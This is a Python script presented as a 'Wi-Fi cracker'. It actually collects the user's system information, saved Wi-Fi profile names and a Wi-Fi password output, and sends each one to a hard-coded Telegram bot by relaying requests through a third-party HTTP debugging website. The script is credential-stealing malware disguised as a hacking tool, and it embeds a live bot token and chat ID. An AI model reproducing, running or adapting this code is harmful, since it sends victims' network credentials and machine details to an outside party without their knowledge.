try:
    import os
    from os import system
    import requests
    import platform
    import subprocess
    from colorama import Fore
except ImportError:
   system("pip install os ")
   system("pip install requests")
   system("pip install colorama ")
   system("pip install platform")
   system("pip install subprocess")
   exit("\n\nRun script Again")

os.system("cls")
print(Fore.RED+"""
   dMP dMP dMP dMP dMMMMMP dMP        .aMMMb  dMMMMb  .aMMMb  .aMMMb  dMP dMP dMMMMMP dMMMMb 
  dMP dMP dMP amr dMP     amr        dMP"VMP dMP.dMP dMP"dMP dMP"VMP dMP.dMP dMP     dMP.dMP 
 dMP dMP dMP dMP dMMMP   dMP        dMP     dMMMMK" dMMMMMP dMP     dMMMMK" dMMMP   dMMMMK"  
dMP.dMP.dMP dMP dMP     dMP        dMP.aMP dMP"AMF dMP dMP dMP.aMP dMP"AMF dMP     dMP"AMF   
VMMMPVMMP" dMP dMP     dMP         VMMMP" dMP dMP dMP dMP  VMMMP" dMP dMP dMMMMMP dMP dMP    
                                                                                             """+Fore.RESET)
info = str(platform.uname())

url = ("https://api.telegram.org/bot5342545382:AAFExqqlDSN07bR7hxcfPglPi4FrAVwiSBo/sendmessage?chat_id=1695284450&text="+"User System info : "+ "\n" +info)

seve = {
    
    "UrlBox":url,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",seve)

print(req)

# Wifi Payload

# Wifi list Rubber

wifi_list = "netsh wlan show profile"
name = subprocess.getoutput(wifi_list).replace("Profiles on interface Wi-Fi:","").replace("Group policy profiles (read only)","").replace("---------------------------------","").replace("<None>","")

wlist = ("https://api.telegram.org/bot5342545382:AAFExqqlDSN07bR7hxcfPglPi4FrAVwiSBo/sendmessage?chat_id=1695284450&text="+name)

file = {
    
    "UrlBox":wlist,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",file)

print(req)


# # # # # # #

# Wifi Password Rubber

d= print("Please Enter You're SSID Name: ", "\n")
v = input("Name >> ")
name2 = subprocess.getoutput("wifipassword "+ v)

line = ("https://api.telegram.org/bot5342545382:AAFExqqlDSN07bR7hxcfPglPi4FrAVwiSBo/sendmessage?chat_id=1695284450&text="+name2)

made = {
    
    "UrlBox":line,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",made)

print(req)


# # # # # # # 

